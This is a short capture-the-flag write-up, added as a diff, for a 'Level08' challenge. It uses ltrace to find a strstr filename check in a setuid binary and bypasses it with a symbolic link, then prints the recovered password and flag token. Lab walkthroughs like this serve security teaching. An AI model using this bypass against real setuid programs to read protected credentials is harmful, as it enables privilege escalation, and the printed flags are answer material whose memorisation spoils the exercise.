@@ -1,0 +1,25 @@
+we can see that in home directory of  Level08 there is executable file with name level08 that has permission of the user flag08
+
+$>./Level08
+./level08 [file to read]
+$>./level08 token
+You may not access 'token'
+
+$>ltrace ./level08 token
+[...]
+strstr("token", "token")                                                = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token')
+[...]
+
+we see that level08 use strstr to check if the file name is 'token' and print 'You may not access' if its true.
+so we have to change the name of the file or just use ln.
+
+$>ln -s token to
+$>./Level08 to
+quif5eloekouj29ke0vouxean
+
+$>su flag08
+Password:
+Dont forget to launch getflag !
+$>getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
